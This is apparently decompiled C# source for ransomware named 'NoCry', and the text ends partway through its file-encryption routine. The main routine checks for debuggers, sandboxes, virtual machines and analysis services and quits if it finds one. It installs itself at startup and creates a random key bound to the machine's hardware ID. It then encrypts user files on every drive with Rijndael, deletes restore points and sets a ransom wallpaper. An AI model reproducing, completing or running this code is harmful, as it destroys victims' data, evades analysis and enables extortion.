using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using NoCry.My;
using NoCry.My.Resources;

namespace NoCry;

[StandardModule]
internal sealed class Module1
{
	private enum CryptoAction
	{
		ActionEncrypt = 1
	}

	private static FileStream fsInput;

	private static FileStream fsOutput;

	private static byte[] bytKey;

	private static byte[] bytIV;

	private static string textbox;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	public static object protect;

	public static List<string> list = new List<string>();

	public static object MT = null;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		//IL_0cb1: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num = default(int);
		bool createdNew = default(bool);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		int num5 = default(int);
		string text = default(string);
		StringBuilder stringBuilder = default(StringBuilder);
		Random random = default(Random);
		int maxrandom = default(int);
		int num6 = default(int);
		string input = default(string);
		int index = default(int);
		char value = default(char);
		string[] logicalDrives = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		DriveInfo driveInfo = default(DriveInfo);
		string[] directories = default(string[]);
		int num8 = default(int);
		string text3 = default(string);
		string lpvParam = default(string);
		IEnumerator enumerator2 = default(IEnumerator);
		string text4 = default(string);
		string[] directories2 = default(string[]);
		int num9 = default(int);
		string ruta = default(string);
		IEnumerator enumerator3 = default(IEnumerator);
		string text5 = default(string);
		IEnumerator enumerator4 = default(IEnumerator);
		IEnumerator enumerator5 = default(IEnumerator);
		string text6 = default(string);
		string text7 = default(string);
		string[] directories3 = default(string[]);
		int num10 = default(int);
		string ruta2 = default(string);
		IEnumerator enumerator6 = default(IEnumerator);
		string text8 = default(string);
		List<string>.Enumerator enumerator7 = default(List<string>.Enumerator);
		string current = default(string);
		string[] logicalDrives2 = default(string[]);
		string text9 = default(string);
		DriveInfo driveInfo2 = default(DriveInfo);
		string[] directories4 = default(string[]);
		int num11 = default(int);
		string text10 = default(string);
		IEnumerator enumerator8 = default(IEnumerator);
		string text11 = default(string);
		IEnumerator enumerator9 = default(IEnumerator);
		string text12 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						createdNew = false;
						goto IL_0006;
					case 4272:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0006;
							case 3:
								goto IL_001a;
							case 4:
							case 5:
								goto IL_0027;
							case 6:
								goto IL_003e;
							case 7:
							case 8:
							case 9:
								goto IL_004c;
							case 10:
								goto IL_0064;
							case 11:
							case 12:
							case 13:
								goto IL_0073;
							case 14:
								goto IL_008b;
							case 15:
							case 16:
							case 17:
								goto IL_009a;
							case 18:
								goto IL_00b2;
							case 19:
							case 20:
							case 21:
								goto IL_00c1;
							case 22:
								goto IL_00d9;
							case 23:
							case 24:
							case 25:
								goto IL_00e8;
							case 26:
								goto IL_0100;
							case 27:
							case 28:
								goto IL_010e;
							case 29:
								goto IL_0120;
							case 31:
								goto IL_014f;
							case 32:
								goto IL_017a;
							case 33:
								goto IL_0184;
							case 34:
								goto IL_018e;
							case 35:
								goto IL_019d;
							case 36:
								goto IL_01b4;
							case 37:
								goto IL_01c5;
							case 38:
								goto IL_01d2;
							case 39:
								goto IL_01e1;
							case 40:
								goto IL_01ed;
							case 41:
								goto IL_021f;
							case 30:
							case 42:
							case 43:
							case 44:
								goto IL_0277;
							case 46:
								goto IL_02a6;
							case 47:
								goto IL_02ae;
							case 48:
								goto IL_02ed;
							case 49:
								goto IL_032c;
							case 50:
								goto IL_034d;
							case 51:
								goto IL_0359;
							case 53:
								goto IL_037b;
							case 54:
								goto IL_039e;
							case 56:
								goto IL_03b2;
							case 58:
								goto IL_03c6;
							case 60:
								goto IL_03da;
							case 62:
								goto IL_03ee;
							case 64:
								goto IL_0402;
							case 66:
								goto IL_0416;
							case 68:
								goto IL_042a;
							case 70:
								goto IL_043e;
							case 72:
								goto IL_0452;
							case 74:
								goto IL_0466;
							case 76:
								goto IL_047a;
							case 77:
								goto IL_04ac;
							case 79:
								goto IL_04bd;
							case 81:
								goto IL_04ce;
							case 83:
								goto IL_04df;
							case 78:
							case 80:
							case 82:
							case 84:
							case 85:
							case 86:
							case 87:
								goto IL_04ee;
							case 88:
								goto IL_04f3;
							case 101:
								goto IL_0513;
							case 102:
								goto IL_054a;
							case 104:
								goto IL_055b;
							case 106:
								goto IL_056c;
							case 108:
								goto IL_057d;
							case 103:
							case 105:
							case 107:
							case 109:
							case 110:
							case 111:
							case 112:
								goto IL_058c;
							case 113:
								goto IL_0591;
							case 52:
							case 114:
							case 115:
								goto IL_05a9;
							case 55:
							case 57:
							case 59:
							case 61:
							case 63:
							case 65:
							case 67:
							case 69:
							case 71:
							case 73:
							case 75:
							case 89:
							case 90:
							case 91:
							case 92:
							case 93:
							case 94:
							case 95:
							case 96:
							case 97:
							case 98:
							case 99:
							case 100:
								goto IL_05b7;
							case 116:
								goto IL_05c5;
							case 117:
								goto IL_05ff;
							case 119:
								goto IL_0610;
							case 121:
								goto IL_0621;
							case 123:
								goto IL_0632;
							case 118:
							case 120:
							case 122:
							case 124:
							case 125:
							case 126:
							case 127:
								goto IL_0641;
							case 128:
								goto IL_0646;
							case 129:
								goto IL_0661;
							case 130:
								goto IL_068f;
							case 131:
								goto IL_06c4;
							case 133:
								goto IL_06d8;
							case 135:
								goto IL_06ec;
							case 137:
								goto IL_0700;
							case 142:
								goto IL_0714;
							case 143:
								goto IL_072f;
							case 132:
							case 134:
							case 136:
							case 138:
							case 139:
							case 140:
							case 141:
								goto IL_0740;
							case 144:
								goto IL_074b;
							case 145:
								goto IL_076f;
							case 146:
								goto IL_077e;
							case 147:
							case 148:
								goto IL_07a2;
							case 149:
								goto IL_07aa;
							case 150:
								goto IL_07bd;
							case 45:
							case 151:
							case 152:
								goto IL_07d7;
							case 153:
								goto IL_07df;
							case 154:
								goto IL_0803;
							case 155:
								goto IL_0812;
							case 157:
								goto IL_0837;
							case 158:
								goto IL_085d;
							case 160:
								goto IL_0874;
							case 162:
								goto IL_088b;
							case 164:
								goto IL_08a2;
							case 166:
								goto IL_08b9;
							case 168:
								goto IL_08d0;
							case 170:
								goto IL_08e7;
							case 172:
								goto IL_08fe;
							case 174:
								goto IL_0915;
							case 176:
								goto IL_092c;
							case 178:
								goto IL_0943;
							case 180:
								goto IL_095a;
							case 181:
								goto IL_098a;
							case 183:
								goto IL_099e;
							case 185:
								goto IL_09b2;
							case 182:
							case 184:
							case 186:
							case 187:
							case 188:
								goto IL_09c4;
							case 189:
								goto IL_09cc;
							case 202:
								goto IL_09ef;
							case 203:
								goto IL_0a24;
							case 205:
								goto IL_0a38;
							case 207:
								goto IL_0a4c;
							case 204:
							case 206:
							case 208:
							case 209:
							case 210:
								goto IL_0a5e;
							case 211:
								goto IL_0a66;
							case 156:
							case 212:
							case 213:
								goto IL_0a81;
							case 159:
							case 161:
							case 163:
							case 165:
							case 167:
							case 169:
							case 171:
							case 173:
							case 175:
							case 177:
							case 179:
							case 190:
							case 191:
							case 192:
							case 193:
							case 194:
							case 195:
							case 196:
							case 197:
							case 198:
							case 199:
							case 200:
							case 201:
								goto IL_0a92;
							case 214:
								goto IL_0aa3;
							case 215:
								goto IL_0adb;
							case 217:
								goto IL_0aef;
							case 219:
								goto IL_0b03;
							case 216:
							case 218:
							case 220:
							case 221:
							case 222:
								goto IL_0b15;
							case 223:
								goto IL_0b1d;
							case 224:
								goto IL_0b38;
							case 225:
								goto IL_0b66;
							case 226:
								goto IL_0b96;
							case 228:
								goto IL_0baa;
							case 230:
								goto IL_0bbe;
							case 234:
								goto IL_0bd2;
							case 235:
								goto IL_0bed;
							case 227:
							case 229:
							case 231:
							case 232:
							case 233:
								goto IL_0bfe;
							case 236:
								goto IL_0c09;
							case 237:
								goto IL_0c21;
							case 238:
							case 239:
								goto IL_0c2c;
							case 240:
								goto IL_0c47;
							case 241:
							case 242:
								goto IL_0c52;
							case 243:
								goto IL_0c69;
							case 245:
								goto IL_0c78;
							case 244:
							case 246:
							case 247:
								goto IL_0c8f;
							case 248:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 249:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_0aa3:
						num = 214;
						enumerator = ((IEnumerable)enc2(Interaction.Environ("USERPROFILE"))).GetEnumerator();
						goto IL_0ac4;
						IL_0a81:
						num = 213;
						num5++;
						goto IL_07ef;
						IL_0006:
						num = 2;
						MT = new Mutex(initiallyOwned: true, St.mute, out createdNew);
						goto IL_001a;
						IL_001a:
						num = 3;
						if (!createdNew)
						{
							ProjectData.EndApp();
						}
						goto IL_0027;
						IL_0ac4:
						if (enumerator.MoveNext())
						{
							text = Conversions.ToString(enumerator.Current);
							goto IL_0adb;
						}
						goto IL_0b1d;
						IL_0027:
						num = 5;
						if (Operators.CompareString(St.Emulator, "True", false) == 0)
						{
							goto IL_003e;
						}
						goto IL_004c;
						IL_003e:
						num = 6;
						if (Anti.Emulator())
						{
							ProjectData.EndApp();
						}
						goto IL_004c;
						IL_0c47:
						num = 240;
						DeleteRestorePoints();
						goto IL_0c52;
						IL_004c:
						num = 9;
						if (Operators.CompareString(St.DetectDebugger, "True", false) == 0)
						{
							goto IL_0064;
						}
						goto IL_0073;
						IL_0064:
						num = 10;
						if (Anti.DetectDebugger())
						{
							ProjectData.EndApp();
						}
						goto IL_0073;
						IL_0adb:
						num = 215;
						if (Operators.CompareString(text, (string)null, false) != 0)
						{
							goto IL_0aef;
						}
						goto IL_0b15;
						IL_0073:
						num = 13;
						if (Operators.CompareString(St.DetectSandboxie, "True", false) == 0)
						{
							goto IL_008b;
						}
						goto IL_009a;
						IL_008b:
						num = 14;
						if (Anti.DetectSandboxie())
						{
							ProjectData.EndApp();
						}
						goto IL_009a;
						IL_0aef:
						num = 217;
						if (!Form4.listenc.Contains(text))
						{
							goto IL_0b03;
						}
						goto IL_0b15;
						IL_009a:
						num = 17;
						if (Operators.CompareString(St.DetectVirtualMachine, "True", false) == 0)
						{
							goto IL_00b2;
						}
						goto IL_00c1;
						IL_00b2:
						num = 18;
						if (Anti.DetectVirtualMachine())
						{
							ProjectData.EndApp();
						}
						goto IL_00c1;
						IL_0b03:
						num = 219;
						Form4.listenc.Add(text);
						goto IL_0b15;
						IL_00c1:
						num = 21;
						if (Operators.CompareString(St.anyrun, "True", false) == 0)
						{
							goto IL_00d9;
						}
						goto IL_00e8;
						IL_00d9:
						num = 22;
						if (Anti.anyrun())
						{
							ProjectData.EndApp();
						}
						goto IL_00e8;
						IL_0b15:
						num = 222;
						goto IL_0ac4;
						IL_00e8:
						num = 25;
						if (Operators.CompareString(St.startup, "True", false) == 0)
						{
							goto IL_0100;
						}
						goto IL_010e;
						IL_0100:
						num = 26;
						startup(Application.get_ExecutablePath());
						goto IL_010e;
						IL_010e:
						num = 28;
						St.hash = Conversions.ToString(Bot());
						goto IL_0120;
						IL_0120:
						num = 29;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", St.Setting, ""), "Done", false) != 0)
						{
							goto IL_014f;
						}
						goto IL_0277;
						IL_014f:
						num = 31;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", St.Setting, ""), (string)null, false) == 0)
						{
							goto IL_017a;
						}
						goto IL_0277;
						IL_017a:
						num = 32;
						stringBuilder = new StringBuilder();
						goto IL_0184;
						IL_0184:
						num = 33;
						random = new Random();
						goto IL_018e;
						IL_018e:
						num = 34;
						maxrandom = St.maxrandom;
						num6 = 1;
						goto IL_01db;
						IL_01db:
						if (num6 <= maxrandom)
						{
							goto IL_019d;
						}
						goto IL_01e1;
						IL_01e1:
						num = 39;
						input = stringBuilder.ToString();
						goto IL_01ed;
						IL_01ed:
						num = 40;
						Interaction.SaveSetting("F", "0", St.Setting, Conversions.ToString(check.AES_Encrypt(input, HWID() + HWID())));
						goto IL_021f;
						IL_021f:
						num = 41;
						Interaction.SaveSetting("G", "0", St.Setting, Conversions.ToString(check.AES_Encrypt(St.Setting, Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())))));
						goto IL_0277;
						IL_019d:
						num = 35;
						index = random.Next(0, St.validchars.Length);
						goto IL_01b4;
						IL_01b4:
						num = 36;
						value = St.validchars[index];
						goto IL_01c5;
						IL_01c5:
						num = 37;
						stringBuilder.Append(value);
						goto IL_01d2;
						IL_01d2:
						num = 38;
						num6++;
						goto IL_01db;
						IL_0277:
						num = 44;
						if (Operators.CompareString(Interaction.GetSetting("C", "0", St.Setting, ""), "Done", false) != 0)
						{
							goto IL_02a6;
						}
						goto IL_07d7;
						IL_02a6:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_02ae;
						IL_02ae:
						num = 47;
						bytKey = CreateKey(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())));
						goto IL_02ed;
						IL_02ed:
						num = 48;
						bytIV = CreateIV(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())));
						goto IL_032c;
						IL_032c:
						num = 49;
						logicalDrives = Environment.GetLogicalDrives();
						num7 = 0;
						goto IL_0339;
						IL_0339:
						if (num7 < logicalDrives.Length)
						{
							text2 = logicalDrives[num7];
							goto IL_034d;
						}
						goto IL_05c5;
						IL_0b1d:
						num = 223;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto IL_0b38;
						IL_034d:
						num = 50;
						driveInfo = new DriveInfo(text2);
						goto IL_0359;
						IL_0359:
						num = 51;
						if (Operators.CompareString(driveInfo.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_037b;
						}
						goto IL_05a9;
						IL_037b:
						num = 53;
						directories = Directory.GetDirectories(text2);
						num8 = 0;
						goto IL_038a;
						IL_038a:
						if (num8 < directories.Length)
						{
							text3 = directories[num8];
							goto IL_039e;
						}
						goto IL_0513;
						IL_0c52:
						num = 242;
						lpvParam = Path.GetTempPath() + "Cry.img";
						goto IL_0c69;
						IL_039e:
						num = 54;
						if (!text3.EndsWith("Bin"))
						{
							goto IL_03b2;
						}
						goto IL_05b7;
						IL_03b2:
						num = 56;
						if (!text3.EndsWith("indows"))
						{
							goto IL_03c6;
						}
						goto IL_05b7;
						IL_03c6:
						num = 58;
						if (!text3.EndsWith("tings"))
						{
							goto IL_03da;
						}
						goto IL_05b7;
						IL_03da:
						num = 60;
						if (!text3.EndsWith("System Volume Information"))
						{
							goto IL_03ee;
						}
						goto IL_05b7;
						IL_03ee:
						num = 62;
						if (!text3.EndsWith("cache"))
						{
							goto IL_0402;
						}
						goto IL_05b7;
						IL_0402:
						num = 64;
						if (!text3.EndsWith("very"))
						{
							goto IL_0416;
						}
						goto IL_05b7;
						IL_0416:
						num = 66;
						if (!text3.EndsWith("rogram Files (x86)"))
						{
							goto IL_042a;
						}
						goto IL_05b7;
						IL_042a:
						num = 68;
						if (!text3.EndsWith("rogram Files"))
						{
							goto IL_043e;
						}
						goto IL_05b7;
						IL_043e:
						num = 70;
						if (!text3.EndsWith("boot"))
						{
							goto IL_0452;
						}
						goto IL_05b7;
						IL_0452:
						num = 72;
						if (!text3.EndsWith("efi"))
						{
							goto IL_0466;
						}
						goto IL_05b7;
						IL_0466:
						num = 74;
						if (!text3.EndsWith(".old"))
						{
							goto IL_047a;
						}
						goto IL_05b7;
						IL_047a:
						num = 76;
						enumerator2 = ((IEnumerable)outonly(text3, ".*")).GetEnumerator();
						goto IL_0495;
						IL_0495:
						if (enumerator2.MoveNext())
						{
							text4 = Conversions.ToString(enumerator2.Current);
							goto IL_04ac;
						}
						goto IL_04f3;
						IL_0b38:
						num = 224;
						directories2 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num9 = 0;
						goto IL_0b52;
						IL_04ac:
						num = 77;
						if (Operators.CompareString(text4, (string)null, false) != 0)
						{
							goto IL_04bd;
						}
						goto IL_04ee;
						IL_04bd:
						num = 79;
						if (!list.Contains(text4))
						{
							goto IL_04ce;
						}
						goto IL_04ee;
						IL_04ce:
						num = 81;
						if (!text4.EndsWith(St.exs))
						{
							goto IL_04df;
						}
						goto IL_04ee;
						IL_04df:
						num = 83;
						list.Add(text4);
						goto IL_04ee;
						IL_04ee:
						num = 87;
						goto IL_0495;
						IL_04f3:
						num = 88;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
						goto IL_05b7;
						IL_0b52:
						if (num9 < directories2.Length)
						{
							ruta = directories2[num9];
							goto IL_0b66;
						}
						goto IL_0c09;
						IL_05b7:
						num = 100;
						num8++;
						goto IL_038a;
						IL_0513:
						num = 101;
						enumerator3 = ((IEnumerable)inonly(driveInfo.Name, ".*")).GetEnumerator();
						goto IL_0533;
						IL_0533:
						if (enumerator3.MoveNext())
						{
							text5 = Conversions.ToString(enumerator3.Current);
							goto IL_054a;
						}
						goto IL_0591;
						IL_0c69:
						num = 243;
						if (!File.Exists(lpvParam))
						{
							goto IL_0c78;
						}
						goto IL_0c8f;
						IL_054a:
						num = 102;
						if (Operators.CompareString(text5, (string)null, false) != 0)
						{
							goto IL_055b;
						}
						goto IL_058c;
						IL_055b:
						num = 104;
						if (!list.Contains(text5))
						{
							goto IL_056c;
						}
						goto IL_058c;
						IL_056c:
						num = 106;
						if (!text5.EndsWith(St.exs))
						{
							goto IL_057d;
						}
						goto IL_058c;
						IL_057d:
						num = 108;
						list.Add(text5);
						goto IL_058c;
						IL_058c:
						num = 112;
						goto IL_0533;
						IL_0591:
						num = 113;
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
						goto IL_05a9;
						IL_0b66:
						num = 225;
						enumerator4 = ((IEnumerable)enc1(ruta)).GetEnumerator();
						goto IL_0b7f;
						IL_05a9:
						num = 115;
						num7++;
						goto IL_0339;
						IL_05c5:
						num = 116;
						enumerator5 = ((IEnumerable)inonly(Interaction.Environ("USERPROFILE"), ".*")).GetEnumerator();
						goto IL_05e8;
						IL_05e8:
						if (enumerator5.MoveNext())
						{
							text6 = Conversions.ToString(enumerator5.Current);
							goto IL_05ff;
						}
						goto IL_0646;
						IL_0b7f:
						if (enumerator4.MoveNext())
						{
							text7 = Conversions.ToString(enumerator4.Current);
							goto IL_0b96;
						}
						goto IL_0bd2;
						IL_05ff:
						num = 117;
						if (Operators.CompareString(text6, (string)null, false) != 0)
						{
							goto IL_0610;
						}
						goto IL_0641;
						IL_0610:
						num = 119;
						if (!list.Contains(text6))
						{
							goto IL_0621;
						}
						goto IL_0641;
						IL_0621:
						num = 121;
						if (!text6.EndsWith(St.exs))
						{
							goto IL_0632;
						}
						goto IL_0641;
						IL_0632:
						num = 123;
						list.Add(text6);
						goto IL_0641;
						IL_0641:
						num = 127;
						goto IL_05e8;
						IL_0646:
						num = 128;
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
						goto IL_0661;
						IL_0c78:
						num = 245;
						((Image)Resources.background).Save(lpvParam, ImageFormat.get_Bmp());
						goto IL_0c8f;
						IL_0661:
						num = 129;
						directories3 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num10 = 0;
						goto IL_067b;
						IL_067b:
						if (num10 < directories3.Length)
						{
							ruta2 = directories3[num10];
							goto IL_068f;
						}
						goto IL_074b;
						IL_0b96:
						num = 226;
						if (Operators.CompareString(text7, (string)null, false) != 0)
						{
							goto IL_0baa;
						}
						goto IL_0bfe;
						IL_068f:
						num = 130;
						enumerator6 = ((IEnumerable)outonly(ruta2, ".*")).GetEnumerator();
						goto IL_06ad;
						IL_06ad:
						if (enumerator6.MoveNext())
						{
							text8 = Conversions.ToString(enumerator6.Current);
							goto IL_06c4;
						}
						goto IL_0714;
						IL_0baa:
						num = 228;
						if (!Form4.listenc.Contains(text7))
						{
							goto IL_0bbe;
						}
						goto IL_0bfe;
						IL_06c4:
						num = 131;
						if (Operators.CompareString(text8, (string)null, false) != 0)
						{
							goto IL_06d8;
						}
						goto IL_0740;
						IL_06d8:
						num = 133;
						if (!list.Contains(text8))
						{
							goto IL_06ec;
						}
						goto IL_0740;
						IL_06ec:
						num = 135;
						if (!text8.EndsWith(St.exs))
						{
							goto IL_0700;
						}
						goto IL_0740;
						IL_0700:
						num = 137;
						list.Add(text8);
						goto IL_0740;
						IL_0740:
						num = 141;
						goto IL_06ad;
						IL_0714:
						num = 142;
						if (enumerator6 is IDisposable)
						{
							(enumerator6 as IDisposable).Dispose();
						}
						goto IL_072f;
						IL_0bbe:
						num = 230;
						Form4.listenc.Add(text7);
						goto IL_0bfe;
						IL_072f:
						num = 143;
						num10++;
						goto IL_067b;
						IL_074b:
						num = 144;
						enumerator7 = list.GetEnumerator();
						goto IL_075d;
						IL_075d:
						if (enumerator7.MoveNext())
						{
							current = enumerator7.Current;
							goto IL_076f;
						}
						goto IL_07aa;
						IL_0bfe:
						num = 233;
						goto IL_0b7f;
						IL_076f:
						num = 145;
						if (File.Exists(current))
						{
							goto IL_077e;
						}
						goto IL_07a2;
						IL_077e:
						num = 146;
						EncryptOrDecryptFile(current, current + St.exs, bytKey, bytIV, CryptoAction.ActionEncrypt);
						goto IL_07a2;
						IL_07a2:
						num = 148;
						goto IL_075d;
						IL_07aa:
						num = 149;
						((IDisposable)enumerator7).Dispose();
						goto IL_07bd;
						IL_07bd:
						num = 150;
						MyProject.Forms.Form1.BackgroundWorker1.RunWorkerAsync();
						goto IL_07d7;
						IL_07d7:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_07df;
						IL_07df:
						num = 153;
						logicalDrives2 = Environment.GetLogicalDrives();
						num5 = 0;
						goto IL_07ef;
						IL_07ef:
						if (num5 < logicalDrives2.Length)
						{
							text9 = logicalDrives2[num5];
							goto IL_0803;
						}
						goto IL_0aa3;
						IL_0bd2:
						num = 234;
						if (enumerator4 is IDisposable)
						{
							(enumerator4 as IDisposable).Dispose();
						}
						goto IL_0bed;
						IL_0803:
						num = 154;
						driveInfo2 = new DriveInfo(text9);
						goto IL_0812;
						IL_0812:
						num = 155;
						if (Operators.CompareString(driveInfo2.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_0837;
						}
						goto IL_0a81;
						IL_0837:
						num = 157;
						directories4 = Directory.GetDirectories(text9);
						num11 = 0;
						goto IL_0849;
						IL_0849:
						if (num11 < directories4.Length)
						{
							text10 = directories4[num11];
							goto IL_085d;
						}
						goto IL_09ef;
						IL_0c8f:
						num = 247;
						SystemParametersInfoA(20, 0, ref lpvParam, 1);
						break;
						IL_085d:
						num = 158;
						if (!text10.EndsWith("Bin"))
						{
							goto IL_0874;
						}
						goto IL_0a92;
						IL_0874:
						num = 160;
						if (!text10.EndsWith("indows"))
						{
							goto IL_088b;
						}
						goto IL_0a92;
						IL_088b:
						num = 162;
						if (!text10.EndsWith("tings"))
						{
							goto IL_08a2;
						}
						goto IL_0a92;
						IL_08a2:
						num = 164;
						if (!text10.EndsWith("System Volume Information"))
						{
							goto IL_08b9;
						}
						goto IL_0a92;
						IL_08b9:
						num = 166;
						if (!text10.EndsWith("cache"))
						{
							goto IL_08d0;
						}
						goto IL_0a92;
						IL_08d0:
						num = 168;
						if (!text10.EndsWith("very"))
						{
							goto IL_08e7;
						}
						goto IL_0a92;
						IL_08e7:
						num = 170;
						if (!text10.EndsWith("rogram Files (x86)"))
						{
							goto IL_08fe;
						}
						goto IL_0a92;
						IL_08fe:
						num = 172;
						if (!text10.EndsWith("rogram Files"))
						{
							goto IL_0915;
						}
						goto IL_0a92;
						IL_0915:
						num = 174;
						if (!text10.EndsWith("boot"))
						{
							goto IL_092c;
						}
						goto IL_0a92;
						IL_092c:
						num = 176;
						if (!text10.EndsWith("efi"))
						{
							goto IL_0943;
						}
						goto IL_0a92;
						IL_0943:
						num = 178;
						if (!text10.EndsWith(".old"))
						{
							goto IL_095a;
						}
						goto IL_0a92;
						IL_095a:
						num = 180;
						enumerator8 = ((IEnumerable)enc1(text10)).GetEnumerator();
						goto IL_0973;
						IL_0973:
						if (enumerator8.MoveNext())
						{
							text11 = Conversions.ToString(enumerator8.Current);
							goto IL_098a;
						}
						goto IL_09cc;
						IL_0bed:
						num = 235;
						num9++;
						goto IL_0b52;
						IL_098a:
						num = 181;
						if (Operators.CompareString(text11, (string)null, false) != 0)
						{
							goto IL_099e;
						}
						goto IL_09c4;
						IL_099e:
						num = 183;
						if (!Form4.listenc.Contains(text11))
						{
							goto IL_09b2;
						}
						goto IL_09c4;
						IL_09b2:
						num = 185;
						Form4.listenc.Add(text11);
						goto IL_09c4;
						IL_09c4:
						num = 188;
						goto IL_0973;
						IL_09cc:
						num = 189;
						if (enumerator8 is IDisposable)
						{
							(enumerator8 as IDisposable).Dispose();
						}
						goto IL_0a92;
						IL_0c09:
						num = 236;
						if (Operators.ConditionalCompareObjectEqual(St.Del, (object)"OK", false))
						{
							goto IL_0c21;
						}
						goto IL_0c2c;
						IL_0a92:
						num = 201;
						num11++;
						goto IL_0849;
						IL_09ef:
						num = 202;
						enumerator9 = ((IEnumerable)enc2(driveInfo2.Name)).GetEnumerator();
						goto IL_0a0d;
						IL_0a0d:
						if (enumerator9.MoveNext())
						{
							text12 = Conversions.ToString(enumerator9.Current);
							goto IL_0a24;
						}
						goto IL_0a66;
						IL_0c21:
						num = 237;
						del.del();
						goto IL_0c2c;
						IL_0a24:
						num = 203;
						if (Operators.CompareString(text12, (string)null, false) != 0)
						{
							goto IL_0a38;
						}
						goto IL_0a5e;
						IL_0a38:
						num = 205;
						if (!Form4.listenc.Contains(text12))
						{
							goto IL_0a4c;
						}
						goto IL_0a5e;
						IL_0a4c:
						num = 207;
						Form4.listenc.Add(text12);
						goto IL_0a5e;
						IL_0a5e:
						num = 210;
						goto IL_0a0d;
						IL_0a66:
						num = 211;
						if (enumerator9 is IDisposable)
						{
							(enumerator9 as IDisposable).Dispose();
						}
						goto IL_0a81;
						IL_0c2c:
						num = 239;
						if (Operators.CompareString(St.DeleteRestorePoints, "True", false) == 0)
						{
							goto IL_0c47;
						}
						goto IL_0c52;
						end_IL_0001_2:
						break;
					}
					num = 248;
					((Form)MyProject.Forms.Form1).ShowDialog();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 4272;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object outonly(string ruta, string mExtesiones)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + mExtesiones, SearchOption.AllDirectories)
			select (ifilesinfo);
	}

	public static object inonly(string ruta, string mExtesiones)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + mExtesiones)
			select (ifilesinfo);
	}

	public static object enc1(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + St.exs, SearchOption.AllDirectories)
			select (ifilesinfo);
	}

	public static object enc2(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + St.exs)
			select (ifilesinfo);
	}

	private static void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		long num5 = default(long);
		int num6 = default(int);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] buffer = default(byte[]);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		FileInfo fileInfo = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 401:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_003d;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_0057;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_006e;
						case 11:
							goto IL_007c;
						case 15:
							goto IL_0097;
						case 16:
							goto IL_00ad;
						case 17:
							goto IL_00bb;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00c6;
						case 19:
							goto IL_00d1;
						case 20:
							goto IL_00db;
						case 21:
							goto IL_00e8;
						case 22:
							goto IL_00f5;
						case 23:
							goto IL_00ff;
						case 24:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
